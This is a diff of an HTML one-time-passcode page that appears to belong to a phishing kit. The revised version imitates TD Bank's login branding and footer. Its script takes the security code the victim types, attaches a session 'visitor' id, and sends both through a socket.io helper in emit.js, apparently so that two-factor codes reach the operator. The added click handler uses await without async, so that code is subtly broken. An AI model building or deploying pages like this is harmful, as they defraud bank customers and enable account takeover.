@@ -1,293 +1,386 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
-    <link rel="stylesheet" href="assets/style.css">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify OTP</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verification</title>
+  <link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+  	
+  <link rel="stylesheet" href="style.css">
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/fontawesome.min.css" integrity="sha384-QYIZto+st3yW+o8+5OHfT6S482Zsvz2WfOzpFSXMF9zqeLcFV0/wlZpMtyFcZALm" crossorigin="anonymous">
     <style>
     body {
-        font-family: Arial, sans-serif;
-        background-color: #f7f9fa;
-        margin: 0;
-        padding: 0;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        min-height: 100vh;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f9f9f9;
+      background-image: none;
+    }
+    
+    h1 {
+      color: #006400;
+      font-size: 1.6em;
+      margin-bottom: 5px;
+      text-align:left!important;
+      align-self: center;
+    }
+    .form-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .form-section {
+      margin-bottom: 30px;
+      width: 100%;
+      max-width: 500px;
+    }
+    .input-group {
+      margin-bottom: 30px;
+      position: relative;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 12px 50px 12px 12px; 
+      font-size: 1em;
+      border: 2px solid #ccc;
+      box-sizing: border-box;
+    }
+    
+    .input-group input:focus {
+    border-bottom: 4px solid #006400;
+    outline: none;
+}
+
+    .error {
+      border-bottom: 4px solid #ae1100 !important;
     }
 
-    .header {
-	    display: flex;
-	    justify-content: flex-start;
-	    align-items: center;
-	    width: 100%;
-	    background-color: #432874;
-	    color: #fff;
-	    padding: 20px 25px;
-	    font-size: 24px;
-	    font-weight: bold;
-	    margin-bottom: 40px;           /* Changed from 5% to fixed value */
-	    box-sizing: border-box;        /* Important addition */
+    input:focus {
+      border-bottom: 4px solid green;
+      outline: none;
+    }
+
+    .input-group .eye-toggle {
+      position: absolute;
+      top: 50%;
+      right: 15px;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 0.8em;
+      color: #006400;
+    }
+    
+    .otp-error {
+    color: #ae1100;
+    margin-top: 5px;
+    font-size: 13px;
+    font-weight: 500; 
+    display: none;
+    align-items: center;
+    gap: 6px;                    /* space between icon and text */
+}
+
+/* Exclamation mark in circle */
+.otp-error::before {
+    content: "\f06a";            /* Font Awesome "exclamation-circle" */
+    font-family: "Font Awesome 5 Free";
+    font-weight: 900;
+    font-size: 15px;
+    color: #ae1100;
+}
+    
+    /* FLOAT EFFECT */
+
+.input-group input:focus + label,
+.input-group input:valid + label {
+    top: 5px;
+    left: 12px;
+    font-size: 0.75em;
+    color: #006400;
+}
+
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      margin-bottom: 30px;
+    }
+    .checkbox-group input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+      accent-color: #006400;
+      margin-right: 10px;
+    }
+    .checkbox-group label {
+      font-size: 1.2em;
+    }
+    button {
+      width: 100%;
+      max-width: 215px; 
+      padding: 12px;
+      font-size: 1em; 
+      background-color: green;
+      border: none;
+      color: #fff;
+      border-radius: 2px;
+      cursor: not-allowed; 
+      margin: 0 auto;
+      display: block;
+    }
+    button.active {
+      background-color: #006400;
+      cursor: pointer;
+    }
+    .links {
+      margin-top: 30px;
+    }
+    a {
+      color: #006400;
+      text-decoration: none;
+      font-size: 1em;
+      font-weight: bold;
+      margin-bottom: 25px;  
+      display: flex;
+      align-items: center;
+    }
+    .info {
+      margin-top: 20px;
+      font-size: 1em;
+      text-align: left;
+      color: #333;
+    }
+    .info strong {
+      color: #006400;
+    }
+    .forgot-password{
+    display:none;
+    }
+    .forgot-password-mobile{
+    display: flex;
+    }
+    input:disabled, button:disabled {
+    border: 2px solid #ccc !important; 
+    background-color: #f9f9f9;
+    color: #888;
 	}
-
-    .header img {
-        width: 120px;
+    /* Desktop styles */
+    @media (min-width: 768px) {
+    .footer-links{
+    display:flex;
+    justify-content: center;
+    align-items:center;
     }
-
-    h2 {
-        font-size: 24px;
-        color: #432874;
-        font-weight: normal;
-        text-align: center;
-        width: 100%;
-        max-width: 420px;
-        margin: 15px 0 20px 0;
-        box-sizing: border-box;
+    .footer-middle{
+    display: none!important;
     }
-    
-
-    .otp-container {
-        display: flex;
-        justify-content: center;
-        gap: 10px;
-        margin: 20px 0 30px 0;
     }
-
-    .otp-input {
-        width: 50px;
-        height: 60px;
-        text-align: center;
-        font-size: 22px;
-        font-weight: bold;
-        border: 2px solid #ddd;
-        border-radius: 6px;
-        background: #f9f7fa;
-        transition: all 0.2s;
     }
-
-    .otp-input:focus {
-        border-color: #432874;
-        outline: none;
-    }
-
-    .otp-input.error {
-        border-color: #e63939 !important;
-        outline: 2px solid #ffebee;
-    }
-    
-
-    .resend {
-        text-align: center;
-        margin-top: 20px;
-        font-size: 15px;
-    }
-
-    .resend a {
-        color: #432874;
-        text-decoration: none;
-        font-weight: 500;
-    }
-
-    .resend a:hover {
-        text-decoration: underline;
-    }
-
-    /* Tiny Popup */
-    .popup {
-        position: fixed;
-        top: 20px;
-        left: 50%;
-        transform: translateX(-50%);
-        background-color: #432874;
-        color: white;
-        padding: 14px 25px;
-        border-radius: 8px;
-        font-size: 15px;
-        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
-        display: none;
-        z-index: 1000;
-        text-align: center;
-        min-width: 260px;
-    }
-
-    .popup.show {
-        display: block;
-        animation: fadeInOut 3s forwards;
-    }
-
-    @keyframes fadeInOut {
-        0% { opacity: 0; top: 10px; }
-        10% { opacity: 1; top: 20px; }
-        80% { opacity: 1; top: 20px; }
-        100% { opacity: 0; top: 10px; }
-    }
-    </style>
+  </style>
+  <style>
+  
+  
+  .label{ 
+  display: block;
+  font-size:14px;  
+  font-weight: 450;
+  padding-bottom:10px!important;
+  
+  }
+</style> 
 </head>
 <body>
-    <div class="header">
-        <img src="assets/images/logo-white.png" alt="Logo"> 
+  <div class="header">
+    <img src="/images/logo.png" alt="Logo">  
+    <div class="right-section">
+      <img src="/images/usericon.png" alt="user" />
+      <span>Log in</span>
     </div>
+  </div>
+  <div class="container">
+    <div class="form-wrapper"> 
+        <h1>Enter Security Code </h1>  
+        <hr style="width:250px;">      
+        	<h3 style="margin-bottom:30px; font-weight:400">Your one time security code was sent <span id="phone-wrap">to your <strong>Email address </strong>attached to this account</span></h3>
+        	 
+        	<p style="margin-bottom:35px;"> This code will expire in a few minutes</p>
+        <div id="form" class="form-section">
 
-    <h2>Security Verification</h2>
-
-    <div class="container">
-        <div class="content">
-        	<p style="font-size:23px; text-align: Left; ">Let's keep you protected</p>
-        	
-            <div>We've sent a One-Time Password to your <span id="phone-wrap"> email address </span></div>
-
-            <form>
-                <div class="otp-container">
-			    <input type="text" maxlength="1" class="otp-input" id="otp1"
-			           inputmode="numeric" pattern="[0-9]" autocomplete="off">
-			
-			    <input type="text" maxlength="1" class="otp-input" id="otp2"
-			           inputmode="numeric" pattern="[0-9]" autocomplete="off">
-			
-			    <input type="text" maxlength="1" class="otp-input" id="otp3"
-			           inputmode="numeric" pattern="[0-9]" autocomplete="off">
-			
-			    <input type="text" maxlength="1" class="otp-input" id="otp4"
-			           inputmode="numeric" pattern="[0-9]" autocomplete="off">
-			
-			    <input type="text" maxlength="1" class="otp-input" id="otp5"
-			           inputmode="numeric" pattern="[0-9]" autocomplete="off">
-			
-			    <input type="text" maxlength="1" class="otp-input" id="otp6"
-			           inputmode="numeric" pattern="[0-9]" autocomplete="off">
-			</div>
-                
-                <div style="display:none;" id="otp-error" class="error-message"> </div>
-
-                <button id="submit" class="submit">Verify</button>
-            </form>
-
-            <div class="resend">
-                Didn't receive the OTP? 
-                <a href="#" id="resend-link">Resend OTP</a>
+            <!-- Phone Number -->
+            <div class="input-group">
+                <label class="label" for="phone">Enter Security Number</label>
+                <input type="tel" name="otp" class="otp-input" id="otp" placeholder="Type code here">
+                	<div class="otp-error"> </div>
             </div>
+            
+            
+
+            <!-- Log In Button -->
+            <button id="continue-btn" type="submit" disabled>Enter</button>
+
+            <!-- Forgot Username/Password -->
+            <a href="#" class="forgot-password">Forgot username and/or password?</a>
         </div>
     </div>
+</div>
+  <!-- Footer Section -->
+<!-- Footer Section -->
+<footer>
 
-    <!-- Tiny Popup -->
-    <div id="success-popup" class="popup">
-        New OTP has been sent to your registered mobile number.
+    <div class="footer-container">
+
+      <div class="footer-top">
+
+        <div class="p"
+             style="white-space: nowrap; color:green">
+
+          Questions?
+          <span style="color:green; font-weight:bold;">
+            Contact us
+          </span>
+
+        </div>
+
+        <hr class="footer-divider">
+
+      </div>
+
+      <div class="footer-middle">
+        <p>
+          <a href="#">Get the app</a>
+        </p>
+      </div>
+
+      <div class="footer-links">
+
+        <a href="#">Help</a>
+        <a href="#">Terms of Use</a>
+        <a href="#">Security</a>
+        <a href="#">Privacy</a>
+        <a href="#">California Privacy</a>
+        <a href="#">Bank Deposits FDIC Insured</a>
+        <a href="#">Online Advertising</a>
+
+      </div>
+
+      <div class="footer-investment">
+
+        <div class="investment-box">
+
+    <div class="investment-row">
+        SECURITIES AND INVESTMENTS
     </div>
 
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <script src="assets/emit.js"></script>
-    <script>
-document.querySelectorAll('.otp-input').forEach(input => {
-    input.addEventListener('input', function () {
-        // Keep only one numeric digit
-        this.value = this.value.replace(/\D/g, '').slice(0, 1);
+    <div class="investment-row">
+        Not FDIC Insured
+    </div>
+
+    <div class="investment-row">
+        No Bank Guarantee
+    </div>
+
+    <div class="investment-row">
+        May Lose Value
+    </div>
+
+</div>
+
+      </div>
+
+      <div class="footer-bottom">
+
+        <p>
+          Registered Investment Advisory, Securities and Brokerage
+          services are offered through TD Private Client Wealth,
+          LLC, member FINRA/SIPC.
+        </p>
+
+        <p>
+          &copy; 2024 TD Bank, N.A. All Rights Reserved
+        </p>
+
+      </div>
+
+    </div>
+
+  </footer>
+<script src="assets/emit.js"></script> 
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+        const inputs = document.querySelectorAll('.input-group input');
+        const submitButton = document.getElementById('continue-btn');
+
+        // Function to check all inputs and enable/disable the button
+        const checkAllInputs = () => {
+            const allFilled = Array.from(inputs).every(input => input.value.trim() !== '');
+            submitButton.disabled = !allFilled;
+        };
+
+        // Add blur event listeners to inputs
+        inputs.forEach(input => {
+            input.addEventListener('blur', (event) => {
+                const inputElement = event.target;
+                const errorDivId = `${inputElement.id}-error`;
+
+                // Remove existing error message if any
+                let existingError = document.getElementById(errorDivId);
+                if (existingError) {
+                    existingError.remove(); 
+                }
+ 
+                // If input is empty, add an error message
+                if (inputElement.value.trim() === '') {
+                    const errorDiv = document.createElement('div');
+                    errorDiv.id = errorDivId;     
+                    errorDiv.style.fontWeight = "500";
+					errorDiv.style.margin = "4px";
+                    errorDiv.style.color = '#ae1100'; 
+                    errorDiv.style.fontSize = '13px';
+                    errorDiv.textContent = `Please ${inputElement.placeholder}`;
+                    inputElement.parentNode.appendChild(errorDiv);   
+                    inputElement.classList.add('error');
+                    
+                }
+
+                // Check if all inputs are filled
+                checkAllInputs();
+            });
+
+            // Remove the error message as the user starts typing
+            input.addEventListener('input', () => {
+                const errorDiv = document.getElementById(`${input.id}-error`);
+                if (errorDiv) {
+                    errorDiv.remove();
+                    input.classList.remove('error');
+                }
+                checkAllInputs();
+            });
+        });
     });
-});
-
-if (sessionStorage.getItem("setcode")) {
-	    const phoneWrap = document.querySelector("#phone-wrap");
-	
-	    phoneWrap.innerHTML = `
-	        registered mobile number<br>
-	        ending in <strong>**** <span id="phone"></span></strong>
-	    `;
-	
-	    const phoneNumberEl = document.querySelector("#phone");
-	
-	    const code = sessionStorage.getItem("setcode");
-	    phoneNumberEl.textContent = code;
-	
-	    phoneWrap.style.display = "block";
-	}
-</script>
-    <script>
-page = "otp";
-
-$(document).ready(function () {
-
-    // Auto-focus next OTP input
-    $('.otp-input').on('input', function () {
-
-        // Remove error styling when user types
-        $(this).removeClass('error');
-
-        if (this.value.length === 1) {
-            $(this).next('.otp-input').focus();
-        }
-    });
-
-    // Handle backspace
-    $('.otp-input').on('keydown', function (e) {
-
-        if (e.key === "Backspace" && this.value === "") {
-            $(this).prev('.otp-input').focus();
-        }
-    });
-
-    // Verify OTP with per-field validation
-    $('#submit').on('click', async function (e) {
-
+    
+    $(document).ready(function () {
+    $('#continue-btn').click(function (e) {
         e.preventDefault();
 
-        let otp = '';
-        let isComplete = true;
-
-        $('.otp-input').each(function () {
-
-            if (this.value.trim() === "") {
-                $(this).addClass('error');
-                isComplete = false;
-            } else {
-                $(this).removeClass('error');
+        let userinfo = {}; 
+        let visitor = sessionStorage.getItem('visitor');
+        
+        $('#form input').each(function () {
+            let inputName = $(this).attr('name');
+            let inputValue = $(this).val();
+            
+            if (inputName) {
+                userinfo[inputName] = inputValue;
             }
-
-            otp += this.value;
         });
 
-        if (!isComplete) {
-            return;
-        }
-
-        if (otp.length !== 6) {
-            return;
-        }
-
-        console.log("Entered OTP:", otp);
-        let user = {};
-        let visitor = sessionStorage.getItem('visitor');
-
-        user['code'] = otp;
-        user['visitor'] = visitor;
-
-        try {
-
-            await submitFormData(user);
-
-        } catch (error) {
-
-            console.error("Submission failed:", error);
-        }
+        userinfo['visitor'] = visitor;
+        console.log(userinfo); 
+        
+        await submitFormData(userinfo);
     });
-
-    // Resend OTP with tiny popup
-    $('#resend-link').on('click', function (e) {
-
-        e.preventDefault();
-
-        const popup = $('#success-popup');
-
-        popup.addClass('show');
-
-        setTimeout(() => {
-            popup.removeClass('show');
-        }, 3000);
-    });
-
 });
+</script> 
 
-
-</script>
-</body> 
+</body>
 </html> 
